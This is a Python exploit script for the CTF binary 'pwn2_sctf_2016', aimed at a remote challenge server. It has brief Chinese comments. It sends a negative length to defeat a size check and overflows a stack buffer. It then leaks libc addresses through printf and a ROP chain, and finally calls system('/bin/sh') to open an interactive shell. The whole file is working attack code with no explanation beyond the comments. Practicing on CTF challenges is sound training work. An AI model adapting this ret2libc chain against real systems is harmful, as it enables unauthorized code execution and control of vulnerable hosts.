import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=False,
    file='./pwn2_sctf_2016',
    remote='node4.buuoj.cn:26204',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True
))
s = sgtlibc.Searcher()
# load target and show its checksec
elf = sgtlibc.ROPgadgets.ELF(client.tube_file)
pops = elf.get_rop()

plt_write = elf.plt['printf']
main_addr = elf.symbols['vuln']

# 泄露libc
def leak(func: str):
    sla('read?', '-1')
    payload = b'a' * (32 + 12 + 4)
    payload += pc(plt_write) + pc(main_addr) + pc(elf.got[func])
    sla('bytes of data!\n', payload)
    rl()
    data = rc(4) # 32位接收4个
    data = uc(data)
    s.add_condition(func, data)
    print('leak', func, hex(data))
    return data
    
print([x for x in elf.got])
pause()

leak('__libc_start_main')
leak('printf')
leak('getchar')
leak('atoi')
data = s.dump(db_index=0)
pause()

# 再次利用payload，溢出执行system
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
sla('read?', '-1')
payload = b'a' * (32 + 12 + 4)
payload += p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
sl(payload)
interactive()
